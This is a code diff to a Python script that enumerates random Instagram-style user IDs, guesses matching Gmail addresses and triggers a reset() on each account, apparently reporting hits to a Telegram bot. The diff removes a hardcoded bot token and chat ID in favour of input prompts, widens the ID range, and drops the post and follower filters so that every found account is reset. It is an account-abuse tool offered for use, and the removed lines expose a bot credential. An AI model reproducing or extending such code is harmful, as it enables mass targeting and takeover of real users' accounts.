@@ -11,8 +11,8 @@ import requests
 from user_agent import generate_user_agent
 import time
 
-chat_id = "5122281931"
-token = "5812995396:AAECr7Ryf51kOOnCV30sr6rUKesUdBux1nM"
+chat_id = input("Id : ")
+token = input("Token : ")
 
 F = '\033[2;32m'
 
@@ -704,7 +704,7 @@ def user_gen():
     while True:
         try:
             lsd = ''.join(random.choice('eQ6xuzk5X8j6_fGvb0gJrc') for _ in range(16))
-            id = str(random.randrange(900990000, 1629009999))
+            id = str(random.randrange(100000, 1629009999))#900990000-1629009999
             headers = {
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
@@ -729,13 +729,7 @@ def user_gen():
             if '_' in username:
                 continue
             else:
-                if post_count > 6:
-                    if follower_count > 60:
-                        reset(username)
-                    else:
-                        print(f"\033[38;5;208m{username}@gmail.com : No meta - followers\033[0m")
-                else:
-                    print(f"\033[38;5;208m{username}@gmail.com : No meta - post\033[0m")
+                reset(username)
         except:
             user_gen()
 
